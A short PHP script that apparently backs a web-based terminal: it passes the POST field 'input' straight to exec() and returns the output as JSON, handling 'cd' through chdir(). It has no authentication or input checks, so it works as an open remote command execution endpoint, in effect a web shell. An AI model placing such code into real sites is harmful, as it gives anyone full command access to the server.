<?php

$inputs = isset($_POST['input']) ? array($_POST['input']) : null;

$outputs = array();

switch (true) {
	case !$inputs[0]: //return empty json object on no input.
		echo "[]";
		break;
	/** @noinspection PhpMissingBreakStatementInspection */
	case preg_match("/^cd\\s+(.*)$/", $inputs[0], $matches):  //TODO: because each time PHP fires up it starts from the same initial directory, chaining cd commands won't work.  To make it work, I'll need to add pwd state into this that it can always chdir to first at the start of a call
		array_pop($inputs); //remove the cd from the inputs, since we can't actually run it directly through the shell.
		$outputs[] = chdir($matches[1]) ? array("Changed path to {$matches[1]}") : array("Did not changed path to {$matches[1]}"); //actually change the directory.
		//add a dir/ls command after the change so we can see the files around us.
		if (DIRECTORY_SEPARATOR === "/") { //linux
			$inputs[] = "ls";
		} else { //windows
			$inputs[] = "dir";
		}
	default:
		echo json_encode(array_merge($outputs, runExec($inputs)));
}

function runExec($inputs) {
	foreach ($inputs as $input) {
		exec($input, $output);
		$outputs[] = array_map(function($line) {
			return htmlspecialchars($line);
		}, $output);
	}
	return $outputs;
}

